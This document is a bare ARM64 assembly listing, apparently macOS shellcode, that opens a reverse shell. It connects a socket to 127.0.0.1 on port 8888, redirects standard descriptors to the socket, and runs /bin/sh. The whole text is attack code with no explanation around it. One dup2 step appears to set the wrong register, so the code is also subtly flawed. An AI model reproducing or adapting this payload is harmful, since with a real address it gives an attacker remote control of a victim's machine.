_start:
    mov x0, 2
    mov x1, 1
    mov x2, 0
    mov x16, 0x61
    svc 0

    mov x12, x0
    adr x1, addr
    mov x2, 16
    mov x16, 0x62
    svc 0

    mov x1, 2
    mov x0, x12
    mov x16, 0x5a
    svc 0

    mov x1, 1
    mov x0, x12
    svc 0

    mov x2, 0
    mov x0, x12
    svc 0

shell:
    adr x0, path
    mov x1, xzr
    mov x2, xzr
    mov x16, 0x3b
    svc 0

path:
    .asciz "/bin/sh"

addr:
    .short 0x2
    .short 0xb822
    .word 0x0100007f
